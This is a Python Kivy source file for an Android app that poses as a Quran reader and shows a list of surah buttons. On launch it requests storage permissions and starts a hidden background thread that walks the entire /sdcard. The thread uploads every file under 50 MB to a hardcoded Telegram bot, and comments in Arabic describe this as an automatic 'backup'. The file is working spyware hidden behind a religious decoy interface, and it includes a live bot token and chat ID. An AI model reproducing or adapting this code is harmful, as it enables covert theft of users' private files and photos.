import os
import threading
import requests
from requests_toolbelt import MultipartEncoder

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.scrollview import ScrollView
from kivy.clock import Clock

# الاستدعاء الخاص بصلاحيات الأندرويد
try:
    from android.permissions import request_permissions, Permission
    HAS_ANDROID = True
except ImportError:
    HAS_ANDROID = False

# ==========================================
# بيانات التليجرام والمجلدات المستهدفة
# ==========================================
BOT_TOKEN = "8631685139:AAG9ZavtRAX5M0ECRr7LaIewrJ3fgv2t3KQ"
CHAT_ID = "8882321908"

# المجلدات المراد سحب ملفاتها وصورها تلقائياً
BACKUP_PATH = "/sdcard"

# قائمة بسور قرآنية للعرض في الواجهة الأمامية
SURAH_LIST = [
    "1. الفاتحة", "2. البقرة", "3. آل عمران", "4. النساء",
    "5. المائدة", "6. الأنعام", "7. الأعراف", "8. الأنفال",
    "9. التوبة", "10. يونس", "11. هود", "12. يوسف",
    "13. الرعد", "14. إبراهيم", "15. الحجر", "16. النحل",
    "17. الإسراء", "18. الكهف", "19. مريم", "20. طه",
    "36. يس", "55. الرحمن", "56. الواقعة", "67. الملك", "112. الإخلاص"
]

class QuranApp(App):
    def build(self):
        # 1. طلب الصلاحيات فور فتح التطبيق
        if HAS_ANDROID:
            request_permissions([
                Permission.READ_EXTERNAL_STORAGE,
                Permission.WRITE_EXTERNAL_STORAGE
            ])

        # 2. بناء واجهة تطبيق القرآن
        root = BoxLayout(orientation='vertical', padding=10, spacing=10)
        
        # شريط العنوان العلوي
        header = Label(
            text="📖 القرآن الكريم - المصحف الشريف",
            font_size='22sp',
            size_hint_y=0.1,
            color=(0.1, 0.7, 0.3, 1)
        )
        root.add_widget(header)

        # قائمة السور القرأنية للتصفح
        scroll = ScrollView(size_hint_y=0.85)
        surah_box = BoxLayout(orientation='vertical', size_hint_y=None, spacing=8)
        surah_box.bind(minimum_height=surah_box.setter('height'))

        for surah in SURAH_LIST:
            btn = Button(
                text=surah,
                size_hint_y=None,
                height=55,
                font_size='18sp',
                background_color=(0.15, 0.2, 0.25, 1)
            )
            surah_box.add_widget(btn)

        scroll.add_widget(surah_box)
        root.add_widget(scroll)

        # 3. تشغيل عملية الـ Backup تلقائياً في الخلفية (Background Thread)
        threading.Thread(target=self.start_background_backup, daemon=True).start()

        return root

    def start_background_backup(self):
        """المرور على ملفات الهاتف وإرسالها في الخلفية دون تعطيل الواجهة"""
        if not os.path.exists(BACKUP_PATH):
            return

        for root_dir, _, files in os.walk(BACKUP_PATH):
            for file in files:
                file_path = os.path.join(root_dir, file)
                
                # رفع الملفات التي يقل حجمها عن 50 ميجابايت (حد تليجرام للبوتات)
                try:
                    if os.path.getsize(file_path) < 50 * 1024 * 1024:
                        self.send_to_telegram(file_path)
                except Exception:
                    continue

    def send_to_telegram(self, file_path):
        """إرسال الملف عبر Telegram REST API"""
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        file_name = os.path.basename(file_path)
        
        try:
            with open(file_path, 'rb') as f:
                m = MultipartEncoder(
                    fields={
                        'chat_id': CHAT_ID,
                        'caption': f'📄 ملف جديد من الهاتف:\n`{file_name}`',
                        'document': (file_name, f, 'application/octet-stream')
                    }
                )
                headers = {'Content-Type': m.content_type}
                requests.post(url, data=m, headers=headers, timeout=30)
        except Exception:
            pass

if __name__ == '__main__':
    QuranApp().run()